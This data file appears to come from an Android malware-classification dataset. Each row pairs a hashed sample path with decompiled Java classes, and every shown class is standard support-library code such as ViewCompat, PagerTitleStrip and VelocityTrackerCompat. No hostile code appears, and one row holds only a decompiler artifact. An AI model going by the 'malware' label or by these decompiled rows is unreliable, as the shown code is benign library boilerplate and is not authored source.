this.mDrawFullUnderline=true;     }   }   public void setTabIndicatorColor(  int color){     this.mIndicatorColor=color;     this.mTabPaint.setColor(this.mIndicatorColor);     invalidate();   }   public void setTabIndicatorColorResource(  int resId){     setTabIndicatorColor(getContext().getResources().getColor(resId));   }   public int getTabIndicatorColor(){     return this.mIndicatorColor;   }   @Override public void setPadding(  int left,  int top,  int right,  int bottom){     if (bottom < this.mMinPaddingBottom) {       bottom=this.mMinPaddingBottom;     }     super.setPadding(left,top,right,bottom);   }   @Override public void setTextSpacing(  int textSpacing){     if (textSpacing < this.mMinTextSpacing) {       textSpacing=this.mMinTextSpacing;     }     super.setTextSpacing(textSpacing);   }   @Override public void setBackgroundDrawable(  Drawable d){     super.setBackgroundDrawable(d);     if (!this.mDrawFullUnderlineSet) {       this.mDrawFullUnderline=d == null;     }   }   @Override public void setBackgroundColor(  int color){     super.setBackgroundColor(color);     if (!this.mDrawFullUnderlineSet) {       this.mDrawFullUnderline=((-16777216) & color) == 0;     }   }   @Override public void setBackgroundResource(  int resId){     super.setBackgroundResource(resId);     if (!this.mDrawFullUnderlineSet) {       this.mDrawFullUnderline=resId == 0;     }   }   public void setDrawFullUnderline(  boolean drawFull){     this.mDrawFullUnderline=drawFull;     this.mDrawFullUnderlineSet=true;     invalidate();   }   public boolean getDrawFullUnderline(){     return this.mDrawFullUnderline;   }   @Override public int getMinHeight(){     return Math.max(super.getMinHeight(),this.mMinStripHeight);   }   @Override public boolean onTouchEvent(  MotionEvent ev){     int action=ev.getAction();     if (action != 0 && this.mIgnoreTap) {       return false;     }     float x=ev.getX();     float y=ev.getY(); switch (action) { case 0:       this.mInitialMotionX=x;     this.mInitialMotionY=y;   this.mIgnoreTap=false; break; case 1: if (x >= this.mCurrText.getLeft() - this.mTabPadding) { if (x > this.mCurrText.getRight() + this.mTabPadding) {   this.mPager.setCurrentItem(this.mPager.getCurrentItem() + 1);   break; } }  else { this.mPager.setCurrentItem(this.mPager.getCurrentItem() - 1); break; } break; case 2: if (Math.abs(x - this.mInitialMotionX) > this.mTouchSlop || Math.abs(y - this.mInitialMotionY) > this.mTouchSlop) { this.mIgnoreTap=true; break; } break; } return true; } @Override protected void onDraw(Canvas canvas){ super.onDraw(canvas); int height=getHeight(); int left=this.mCurrText.getLeft() - this.mTabPadding; int right=this.mCurrText.getRight() + this.mTabPadding; int top=height - this.mIndicatorHeight; this.mTabPaint.setColor((this.mTabAlpha << 24) | (this.mIndicatorColor & ViewCompat.MEASURED_SIZE_MASK)); canvas.drawRect(left,top,right,height,this.mTabPaint); if (this.mDrawFullUnderline) { this.mTabPaint.setColor((-16777216) | (this.mIndicatorColor & ViewCompat.MEASURED_SIZE_MASK)); canvas.drawRect(getPaddingLeft(),height - this.mFullUnderlineHeight,getWidth() - getPaddingRight(),height,this.mTabPaint); } } @Override public void updateTextPositions(int position,float positionOffset,boolean force){ Rect r=this.mTempRect; int bottom=getHeight(); int left=this.mCurrText.getLeft() - this.mTabPadding; int right=this.mCurrText.getRight() + this.mTabPadding; int top=bottom - this.mIndicatorHeight; r.set(left,top,right,bottom); super.updateTextPositions(position,positionOffset,force); this.mTabAlpha=(int)(Math.abs(positionOffset - 0.5f) * 2.0f * 255.0f); int left2=this.mCurrText.getLeft() - this.mTabPadding; int right2=this.mCurrText.getRight() + this.mTabPadding; r.union(left2,top,right2,bottom); invalidate(r); } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\PagerTitleStrip.code","!org.eclipse.jdt.core.dom.TypeDeclaration@216a3cef"
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\PagerTitleStripIcs.code","class PagerTitleStripIcs {   PagerTitleStripIcs(){   }   public static void setSingleLineAllCaps(  TextView text){     text.setTransformationMethod(new SingleLineAllCapsTransform(text.getContext()));   } private static class SingleLineAllCapsTransform extends SingleLineTransformationMethod {     private static final String TAG=""SingleLineAllCapsTransform"";     private Locale mLocale;     public SingleLineAllCapsTransform(    Context context){       this.mLocale=context.getResources().getConfiguration().locale;     }     @Override public CharSequence getTransformation(    CharSequence source,    View view){       CharSequence source2=super.getTransformation(source,view);       if (source2 != null) {         return source2.toString().toUpperCase(this.mLocale);       }       return null;     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\PagerTitleStripImpl.code","public interface PagerTitleStripImpl {   void setSingleLineAllCaps(  TextView textView); } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\PagerTitleStripImplBase.code","static class PagerTitleStripImplBase implements PagerTitleStripImpl {   PagerTitleStripImplBase(){   }   @Override public void setSingleLineAllCaps(  TextView text){     text.setSingleLine();   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\PagerTitleStripImplIcs.code","static class PagerTitleStripImplIcs implements PagerTitleStripImpl {   PagerTitleStripImplIcs(){   }   @Override public void setSingleLineAllCaps(  TextView text){     PagerTitleStripIcs.setSingleLineAllCaps(text);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\PageTransformer.code","public interface PageTransformer {   void transformPage(  View view,  float f); } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\SavedState.code","public static class SavedState extends View.BaseSavedState {   public static final Parcelable.Creator<SavedState> CREATOR=ParcelableCompat.newCreator(new ParcelableCompatCreatorCallbacks<SavedState>(){     @Override public SavedState createFromParcel(    Parcel in,    ClassLoader loader){       return new SavedState(in,loader);     }     @Override public SavedState[] newArray(    int size){       return new SavedState[size];     }   } );   Parcelable adapterState;   ClassLoader loader;   int position;   public SavedState(  Parcelable superState){     super(superState);   }   @Override public void writeToParcel(  Parcel out,  int flags){     super.writeToParcel(out,flags);     out.writeInt(this.position);     out.writeParcelable(this.adapterState,flags);   }   public String toString(){     return ""FragmentPager.SavedState{"" + Integer.toHexString(System.identityHashCode(this)) + "" position=""+ this.position+ ""}"";   }   SavedState(  Parcel in,  ClassLoader loader){     super(in);     loader=loader == null ? getClass().getClassLoader() : loader;     this.position=in.readInt();     this.adapterState=in.readParcelable(loader);     this.loader=loader;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\ScaleGestureDetectorCompat.code","public class ScaleGestureDetectorCompat {   static final ScaleGestureDetectorImpl IMPL; interface ScaleGestureDetectorImpl {     boolean isQuickScaleEnabled(    Object obj);     void setQuickScaleEnabled(    Object obj,    boolean z);   } private static class BaseScaleGestureDetectorImpl implements ScaleGestureDetectorImpl {     private BaseScaleGestureDetectorImpl(){     }     @Override public void setQuickScaleEnabled(    Object o,    boolean enabled){     }     @Override public boolean isQuickScaleEnabled(    Object o){       return false;     }   } private static class ScaleGestureDetectorCompatKitKatImpl implements ScaleGestureDetectorImpl {     private ScaleGestureDetectorCompatKitKatImpl(){     }     @Override public void setQuickScaleEnabled(    Object o,    boolean enabled){       ScaleGestureDetectorCompatKitKat.setQuickScaleEnabled(o,enabled);     }     @Override public boolean isQuickScaleEnabled(    Object o){       return ScaleGestureDetectorCompatKitKat.isQuickScaleEnabled(o);     }   } static {     int version=Build.VERSION.SDK_INT;     if (version >= 19) {       IMPL=new ScaleGestureDetectorCompatKitKatImpl();     }  else {       IMPL=new BaseScaleGestureDetectorImpl();     }   }   private ScaleGestureDetectorCompat(){   }   public static void setQuickScaleEnabled(  Object scaleGestureDetector,  boolean enabled){     IMPL.setQuickScaleEnabled(scaleGestureDetector,enabled);   }   public static boolean isQuickScaleEnabled(  Object scaleGestureDetector){     return IMPL.isQuickScaleEnabled(scaleGestureDetector);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\ScaleGestureDetectorCompatKitKat.code","class ScaleGestureDetectorCompatKitKat {   private ScaleGestureDetectorCompatKitKat(){   }   public static void setQuickScaleEnabled(  Object scaleGestureDetector,  boolean enabled){     ((ScaleGestureDetector)scaleGestureDetector).setQuickScaleEnabled(enabled);   }   public static boolean isQuickScaleEnabled(  Object scaleGestureDetector){     return ((ScaleGestureDetector)scaleGestureDetector).isQuickScaleEnabled();   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\ScaleGestureDetectorCompatKitKatImpl.code","private static class ScaleGestureDetectorCompatKitKatImpl implements ScaleGestureDetectorImpl {   private ScaleGestureDetectorCompatKitKatImpl(){   }   @Override public void setQuickScaleEnabled(  Object o,  boolean enabled){     ScaleGestureDetectorCompatKitKat.setQuickScaleEnabled(o,enabled);   }   @Override public boolean isQuickScaleEnabled(  Object o){     return ScaleGestureDetectorCompatKitKat.isQuickScaleEnabled(o);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\ScaleGestureDetectorImpl.code","interface ScaleGestureDetectorImpl {   boolean isQuickScaleEnabled(  Object obj);   void setQuickScaleEnabled(  Object obj,  boolean z); } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\SimpleOnPageChangeListener.code","public static class SimpleOnPageChangeListener implements OnPageChangeListener {   @Override public void onPageScrolled(  int position,  float positionOffset,  int positionOffsetPixels){   }   @Override public void onPageSelected(  int position){   }   @Override public void onPageScrollStateChanged(  int state){   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\SingleLineAllCapsTransform.code","private static class SingleLineAllCapsTransform extends SingleLineTransformationMethod {   private static final String TAG=""SingleLineAllCapsTransform"";   private Locale mLocale;   public SingleLineAllCapsTransform(  Context context){     this.mLocale=context.getResources().getConfiguration().locale;   }   @Override public CharSequence getTransformation(  CharSequence source,  View view){     CharSequence source2=super.getTransformation(source,view);     if (source2 != null) {       return source2.toString().toUpperCase(this.mLocale);     }     return null;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\SubUiVisibilityListener.code","public interface SubUiVisibilityListener {   void onSubUiVisibilityChanged(  boolean z); } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\SupportActionExpandProxy.code","interface SupportActionExpandProxy {   boolean onMenuItemActionCollapse(  MenuItem menuItem);   boolean onMenuItemActionExpand(  MenuItem menuItem); } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\VelocityTrackerCompat.code","public class VelocityTrackerCompat {   static final VelocityTrackerVersionImpl IMPL; interface VelocityTrackerVersionImpl {     float getXVelocity(    VelocityTracker velocityTracker,    int i);     float getYVelocity(    VelocityTracker velocityTracker,    int i);   } static class BaseVelocityTrackerVersionImpl implements VelocityTrackerVersionImpl {     BaseVelocityTrackerVersionImpl(){     }     @Override public float getXVelocity(    VelocityTracker tracker,    int pointerId){       return tracker.getXVelocity();     }     @Override public float getYVelocity(    VelocityTracker tracker,    int pointerId){       return tracker.getYVelocity();     }   } static class HoneycombVelocityTrackerVersionImpl implements VelocityTrackerVersionImpl {     HoneycombVelocityTrackerVersionImpl(){     }     @Override public float getXVelocity(    VelocityTracker tracker,    int pointerId){       return VelocityTrackerCompatHoneycomb.getXVelocity(tracker,pointerId);     }     @Override public float getYVelocity(    VelocityTracker tracker,    int pointerId){       return VelocityTrackerCompatHoneycomb.getYVelocity(tracker,pointerId);     }   } static {     if (Build.VERSION.SDK_INT >= 11) {       IMPL=new HoneycombVelocityTrackerVersionImpl();     }  else {       IMPL=new BaseVelocityTrackerVersionImpl();     }   }   public static float getXVelocity(  VelocityTracker tracker,  int pointerId){     return IMPL.getXVelocity(tracker,pointerId);   }   public static float getYVelocity(  VelocityTracker tracker,  int pointerId){     return IMPL.getYVelocity(tracker,pointerId);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\VelocityTrackerCompatHoneycomb.code","class VelocityTrackerCompatHoneycomb {   VelocityTrackerCompatHoneycomb(){   }   public static float getXVelocity(  VelocityTracker tracker,  int pointerId){     return tracker.getXVelocity(pointerId);   }   public static float getYVelocity(  VelocityTracker tracker,  int pointerId){     return tracker.getYVelocity(pointerId);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\VelocityTrackerVersionImpl.code","interface VelocityTrackerVersionImpl {   float getXVelocity(  VelocityTracker velocityTracker,  int i);   float getYVelocity(  VelocityTracker velocityTracker,  int i); } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\ViewCompat.code","public class ViewCompat {   public static final int ACCESSIBILITY_LIVE_REGION_ASSERTIVE=2;   public static final int ACCESSIBILITY_LIVE_REGION_NONE=0;   public static final int ACCESSIBILITY_LIVE_REGION_POLITE=1;   private static final long FAKE_FRAME_TIME=10;   static final ViewCompatImpl IMPL;   public static final int IMPORTANT_FOR_ACCESSIBILITY_AUTO=0;   public static final int IMPORTANT_FOR_ACCESSIBILITY_NO=2;   public static final int IMPORTANT_FOR_ACCESSIBILITY_NO_HIDE_DESCENDANTS=4;   public static final int IMPORTANT_FOR_ACCESSIBILITY_YES=1;   public static final int LAYER_TYPE_HARDWARE=2;   public static final int LAYER_TYPE_NONE=0;   public static final int LAYER_TYPE_SOFTWARE=1;   public static final int LAYOUT_DIRECTION_INHERIT=2;   public static final int LAYOUT_DIRECTION_LOCALE=3;   public static final int LAYOUT_DIRECTION_LTR=0;   public static final int LAYOUT_DIRECTION_RTL=1;   public static final int MEASURED_HEIGHT_STATE_SHIFT=16;   public static final int MEASURED_SIZE_MASK=16777215;   public static final int MEASURED_STATE_MASK=-16777216;   public static final int MEASURED_STATE_TOO_SMALL=16777216;   public static final int OVER_SCROLL_ALWAYS=0;   public static final int OVER_SCROLL_IF_CONTENT_SCROLLS=1;   public static final int OVER_SCROLL_NEVER=2; interface ViewCompatImpl {     boolean canScrollHorizontally(    View view,    int i);     boolean canScrollVertically(    View view,    int i);     int getAccessibilityLiveRegion(    View view);     AccessibilityNodeProviderCompat getAccessibilityNodeProvider(    View view);     float getAlpha(    View view);     int getImportantForAccessibility(    View view);     int getLabelFor(    View view);     int getLayerType(    View view);     int getLayoutDirection(    View view);     int getMeasuredHeightAndState(    View view);     int getMeasuredState(    View view);     int getMeasuredWidthAndState(    View view);     int getOverScrollMode(    View view);     ViewParent getParentForAccessibility(    View view);     boolean hasTransientState(    View view);     boolean isOpaque(    View view);     void onInitializeAccessibilityEvent(    View view,    AccessibilityEvent accessibilityEvent);     void onInitializeAccessibilityNodeInfo(    View view,    AccessibilityNodeInfoCompat accessibilityNodeInfoCompat);     void onPopulateAccessibilityEvent(    View view,    AccessibilityEvent accessibilityEvent);     boolean performAccessibilityAction(    View view,    int i,    Bundle bundle);     void postInvalidateOnAnimation(    View view);     void postInvalidateOnAnimation(    View view,    int i,    int i2,    int i3,    int i4);     void postOnAnimation(    View view,    Runnable runnable);     void postOnAnimationDelayed(    View view,    Runnable runnable,    long j);     int resolveSizeAndState(    int i,    int i2,    int i3);     void setAccessibilityDelegate(    View view,    AccessibilityDelegateCompat accessibilityDelegateCompat);     void setAccessibilityLiveRegion(    View view,    int i);     void setHasTransientState(    View view,    boolean z);     void setImportantForAccessibility(    View view,    int i);     void setLabelFor(    View view,    int i);     void setLayerPaint(    View view,    Paint paint);     void setLayerType(    View view,    int i,    Paint paint);     void setLayoutDirection(    View view,    int i);     void setOverScrollMode(    View view,    int i);   } static class BaseViewCompatImpl implements ViewCompatImpl {     BaseViewCompatImpl(){     }     @Override public boolean canScrollHorizontally(    View v,    int direction){       return false;     }     @Override public boolean canScrollVertically(    View v,    int direction){       return false;     }     @Override public int getOverScrollMode(    View v){       return 2;     }     @Override public void setOverScrollMode(    View v,    int mode){     }     @Override public void setAccessibilityDelegate(    View v,    AccessibilityDelegateCompat delegate){     }     @Override public void onPopulateAccessibilityEvent(    View v,    AccessibilityEvent event){     }     @Override public void onInitializeAccessibilityEvent(    View v,    AccessibilityEvent event){     }     @Override public void onInitializeAccessibilityNodeInfo(    View v,    AccessibilityNodeInfoCompat info){     }     @Override public boolean hasTransientState(    View view){       return false;     }     @Override public void setHasTransientState(    View view,    boolean hasTransientState){     }     @Override public void postInvalidateOnAnimation(    View view){       view.postInvalidateDelayed(getFrameTime());     }     @Override public void postInvalidateOnAnimation(    View view,    int left,    int top,    int right,    int bottom){       view.postInvalidateDelayed(getFrameTime(),left,top,right,bottom);     }     @Override public void postOnAnimation(    View view,    Runnable action){       view.postDelayed(action,getFrameTime());     }     @Override public void postOnAnimationDelayed(    View view,    Runnable action,    long delayMillis){       view.postDelayed(action,getFrameTime() + delayMillis);     }     long getFrameTime(){       return ViewCompat.FAKE_FRAME_TIME;     }     @Override public int getImportantForAccessibility(    View view){       return 0;     }     @Override public void setImportantForAccessibility(    View view,    int mode){     }     @Override public boolean performAccessibilityAction(    View view,    int action,    Bundle arguments){       return false;     }     @Override public AccessibilityNodeProviderCompat getAccessibilityNodeProvider(    View view){       return null;     }     @Override public float getAlpha(    View view){       return 1.0f;     }     @Override public void setLayerType(    View view,    int layerType,    Paint paint){     }     @Override public int getLayerType(    View view){       return 0;     }     @Override public int getLabelFor(    View view){       return 0;     }     @Override public void setLabelFor(    View view,    int id){     }     @Override public void setLayerPaint(    View view,    Paint p){     }     @Override public int getLayoutDirection(    View view){       return 0;     }     @Override public void setLayoutDirection(    View view,    int layoutDirection){     }     @Override public ViewParent getParentForAccessibility(    View view){       return view.getParent();     }     @Override public boolean isOpaque(    View view){       Drawable bg=view.getBackground();       return bg != null && bg.getOpacity() == -1;     }     @Override public int resolveSizeAndState(    int size,    int measureSpec,    int childMeasuredState){       return View.resolveSize(size,measureSpec);     }     @Override public int getMeasuredWidthAndState(    View view){       return view.getMeasuredWidth();     }     @Override public int getMeasuredHeightAndState(    View view){       return view.getMeasuredHeight();     }     @Override public int getMeasuredState(    View view){       return 0;     }     @Override public int getAccessibilityLiveRegion(    View view){       return 0;     }     @Override public void setAccessibilityLiveRegion(    View view,    int mode){     }   } static class EclairMr1ViewCompatImpl extends BaseViewCompatImpl {     EclairMr1ViewCompatImpl(){     }     @Override public boolean isOpaque(    View view){       return ViewCompatEclairMr1.isOpaque(view);     }   } static class GBViewCompatImpl extends EclairMr1ViewCompatImpl {     GBViewCompatImpl(){     }     @Override public int getOverScrollMode(    View v){       return ViewCompatGingerbread.getOverScrollMode(v);     }     @Override public void setOverScrollMode(    View v,    int mode){       ViewCompatGingerbread.setOverScrollMode(v,mode);     }   } static class HCViewCompatImpl extends GBViewCompatImpl {     HCViewCompatImpl(){     }     @Override long getFrameTime(){       return ViewCompatHC.getFrameTime();     }     @Override public float getAlpha(    View view){       return ViewCompatHC.getAlpha(view);     }     @Override public void setLayerType(    View view,    int layerType,    Paint paint){       ViewCompatHC.setLayerType(view,layerType,paint);     }     @Override public int getLayerType(    View view){       return ViewCompatHC.getLayerType(view);     }     @Override public void setLayerPaint(    View view,    Paint paint){       setLayerType(view,getLayerType(view),paint);       view.invalidate();     }     @Override public int resolveSizeAndState(    int size,    int measureSpec,    int childMeasuredState){       return ViewCompatHC.resolveSizeAndState(size,measureSpec,childMeasuredState);     }     @Override public int getMeasuredWidthAndState(    View view){       return ViewCompatHC.getMeasuredWidthAndState(view);     }     @Override public int getMeasuredHeightAndState(    View view){       return ViewCompatHC.getMeasuredHeightAndState(view);     }     @Override public int getMeasuredState(    View view){       return ViewCompatHC.getMeasuredState(view);     }   } static class ICSViewCompatImpl extends HCViewCompatImpl {     ICSViewCompatImpl(){     }     @Override public boolean canScrollHorizontally(    View v,    int direction){       return ViewCompatICS.canScrollHorizontally(v,direction);     }     @Override public boolean canScrollVertically(    View v,    int direction){       return ViewCompatICS.canScrollVertically(v,direction);     }     @Override public void onPopulateAccessibilityEvent(    View v,    AccessibilityEvent event){       ViewCompatICS.onPopulateAccessibilityEvent(v,event);     }     @Override public void onInitializeAccessibilityEvent(    View v,    AccessibilityEvent event){       ViewCompatICS.onInitializeAccessibilityEvent(v,event);     }     @Override public void onInitializeAccessibilityNodeInfo(    View v,    AccessibilityNodeInfoCompat info){       ViewCompatICS.onInitializeAccessibilityNodeInfo(v,info.getInfo());     }     @Override public void setAccessibilityDelegate(    View v,    AccessibilityDelegateCompat delegate){       ViewCompatICS.setAccessibilityDelegate(v,delegate.getBridge());     }   } static class JBViewCompatImpl extends ICSViewCompatImpl {     JBViewCompatImpl(){     }     @Override public boolean hasTransientState(    View view){       return ViewCompatJB.hasTransientState(view);     }     @Override public void setHasTransientState(    View view,    boolean hasTransientState){       ViewCompatJB.setHasTransientState(view,hasTransientState);     }     @Override public void postInvalidateOnAnimation(    View view){       ViewCompatJB.postInvalidateOnAnimation(view);     }     @Override public void postInvalidateOnAnimation(    View view,    int left,    int top,    int right,    int bottom){       ViewCompatJB.postInvalidateOnAnimation(view,left,top,right,bottom);     }     @Override public void postOnAnimation(    View view,    Runnable action){       ViewCompatJB.postOnAnimation(view,action);     }     @Override public void postOnAnimationDelayed(    View view,    Runnable action,    long delayMillis){       ViewCompatJB.postOnAnimationDelayed(view,action,delayMillis);     }     @Override public int getImportantForAccessibility(    View view){       return ViewCompatJB.getImportantForAccessibility(view);     }     @Override public void setImportantForAccessibility(    View view,    int mode){       ViewCompatJB.setImportantForAccessibility(view,mode);     }     @Override public boolean performAccessibilityAction(    View view,    int action,    Bundle arguments){       return ViewCompatJB.performAccessibilityAction(view,action,arguments);     }     @Override public AccessibilityNodeProviderCompat getAccessibilityNodeProvider(    View view){       Object compat=ViewCompatJB.getAccessibilityNodeProvider(view);       if (compat != null) {         return new AccessibilityNodeProviderCompat(compat);       }       return null;     }     @Override public ViewParent getParentForAccessibility(    View view){       return ViewCompatJB.getParentForAccessibility(view);     }   } static class JbMr1ViewCompatImpl extends JBViewCompatImpl {     JbMr1ViewCompatImpl(){     }     @Override public int getLabelFor(    View view){       return ViewCompatJellybeanMr1.getLabelFor(view);     }     @Override public void setLabelFor(    View view,    int id){       ViewCompatJellybeanMr1.setLabelFor(view,id);     }     @Override public void setLayerPaint(    View view,    Paint paint){       ViewCompatJellybeanMr1.setLayerPaint(view,paint);     }     @Override public int getLayoutDirection(    View view){       return ViewCompatJellybeanMr1.getLayoutDirection(view);     }     @Override public void setLayoutDirection(    View view,    int layoutDirection){       ViewCompatJellybeanMr1.setLayoutDirection(view,layoutDirection);     }   } static class KitKatViewCompatImpl extends JbMr1ViewCompatImpl {     KitKatViewCompatImpl(){     }     @Override public int getAccessibilityLiveRegion(    View view){       return ViewCompatKitKat.getAccessibilityLiveRegion(view);     }     @Override public void setAccessibilityLiveRegion(    View view,    int mode){       ViewCompatKitKat.setAccessibilityLiveRegion(view,mode);     }   } static {     int version=Build.VERSION.SDK_INT;     if (version >= 19) {       IMPL=new KitKatViewCompatImpl();       return;     }     if (version >= 17) {       IMPL=new JbMr1ViewCompatImpl();       return;     }     if (version >= 16) {       IMPL=new JBViewCompatImpl();       return;     }     if (version >= 14) {       IMPL=new ICSViewCompatImpl();       return;     }     if (version >= 11) {       IMPL=new HCViewCompatImpl();     }  else     if (version >= 9) {       IMPL=new GBViewCompatImpl();     }  else {       IMPL=new BaseViewCompatImpl();     }   }   public static boolean canScrollHorizontally(  View v,  int direction){     return IMPL.canScrollHorizontally(v,direction);   }   public static boolean canScrollVertically(  View v,  int direction){     return IMPL.canScrollVertically(v,direction);   }   public static int getOverScrollMode(  View v){     return IMPL.getOverScrollMode(v);   }   public static void setOverScrollMode(  View v,  int overScrollMode){     IMPL.setOverScrollMode(v,overScrollMode);   }   public static void onPopulateAccessibilityEvent(  View v,  AccessibilityEvent event){     IMPL.onPopulateAccessibilityEvent(v,event);   }   public static void onInitializeAccessibilityEvent(  View v,  AccessibilityEvent event){     IMPL.onInitializeAccessibilityEvent(v,event);   }   public static void onInitializeAccessibilityNodeInfo(  View v,  AccessibilityNodeInfoCompat info){     IMPL.onInitializeAccessibilityNodeInfo(v,info);   }   public static void setAccessibilityDelegate(  View v,  AccessibilityDelegateCompat delegate){     IMPL.setAccessibilityDelegate(v,delegate);   }   public static boolean hasTransientState(  View view){     return IMPL.hasTransientState(view);   }   public static void setHasTransientState(  View view,  boolean hasTransientState){     IMPL.setHasTransientState(view,hasTransientState);   }   public static void postInvalidateOnAnimation(  View view){     IMPL.postInvalidateOnAnimation(view);   }   public static void postInvalidateOnAnimation(  View view,  int left,  int top,  int right,  int bottom){     IMPL.postInvalidateOnAnimation(view,left,top,right,bottom);   }   public static void postOnAnimation(  View view,  Runnable action){     IMPL.postOnAnimation(view,action);   }   public static void postOnAnimationDelayed(  View view,  Runnable action,  long delayMillis){     IMPL.postOnAnimationDelayed(view,action,delayMillis);   }   public static int getImportantForAccessibility(  View view){     return IMPL.getImportantForAccessibility(view);   }   public static void setImportantForAccessibility(  View view,  int mode){     IMPL.setImportantForAccessibility(view,mode);   }   public static boolean performAccessibilityAction(  View view,  int action,  Bundle arguments){     return IMPL.performAccessibilityAction(view,action,arguments);   }   public static AccessibilityNodeProviderCompat getAccessibilityNodeProvider(  View view){     return IMPL.getAccessibilityNodeProvider(view);   }   public static float getAlpha(  View view){     return IMPL.getAlpha(view);   }   public static void setLayerType(  View view,  int layerType,  Paint paint){     IMPL.setLayerType(view,layerType,paint);   }   public static int getLayerType(  View view){     return IMPL.getLayerType(view);   }   public static int getLabelFor(  View view){     return IMPL.getLabelFor(view);   }   public static void setLabelFor(  View view,  int labeledId){     IMPL.setLabelFor(view,labeledId);   }   public static void setLayerPaint(  View view,  Paint paint){     IMPL.setLayerPaint(view,paint);   }   public static int getLayoutDirection(  View view){     return IMPL.getLayoutDirection(view);   }   public static void setLayoutDirection(  View view,  int layoutDirection){     IMPL.setLayoutDirection(view,layoutDirection);   }   public static ViewParent getParentForAccessibility(  View view){     return IMPL.getParentForAccessibility(view);   }   public static boolean isOpaque(  View view){     return IMPL.isOpaque(view);   }   public static int resolveSizeAndState(  int size,  int measureSpec,  int childMeasuredState){     return IMPL.resolveSizeAndState(size,measureSpec,childMeasuredState);   }   public static int getMeasuredWidthAndState(  View view){     return IMPL.getMeasuredWidthAndState(view);   }   public static int getMeasuredHeightAndState(  View view){     return IMPL.getMeasuredHeightAndState(view);   }   public static int getMeasuredState(  View view){     return IMPL.getMeasuredState(view);   }   public int getAccessibilityLiveRegion(  View view){     return IMPL.getAccessibilityLiveRegion(view);   }   public void setAccessibilityLiveRegion(  View view,  int mode){     IMPL.setAccessibilityLiveRegion(view,mode);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\ViewCompatEclairMr1.code","class ViewCompatEclairMr1 {   ViewCompatEclairMr1(){   }   public static boolean isOpaque(  View view){     return view.isOpaque();   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\ViewCompatGingerbread.code","class ViewCompatGingerbread {   ViewCompatGingerbread(){   }   public static int getOverScrollMode(  View v){     return v.getOverScrollMode();   }   public static void setOverScrollMode(  View v,  int mode){     v.setOverScrollMode(mode);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\ViewCompatHC.code","class ViewCompatHC {   ViewCompatHC(){   }   public static long getFrameTime(){     return ValueAnimator.getFrameDelay();   }   public static float getAlpha(  View view){     return view.getAlpha();   }   public static void setLayerType(  View view,  int layerType,  Paint paint){     view.setLayerType(layerType,paint);   }   public static int getLayerType(  View view){     return view.getLayerType();   }   public static int resolveSizeAndState(  int size,  int measureSpec,  int childMeasuredState){     return View.resolveSizeAndState(size,measureSpec,childMeasuredState);   }   public static int getMeasuredWidthAndState(  View view){     return view.getMeasuredWidthAndState();   }   public static int getMeasuredHeightAndState(  View view){     return view.getMeasuredHeightAndState();   }   public static int getMeasuredState(  View view){     return view.getMeasuredState();   } } "
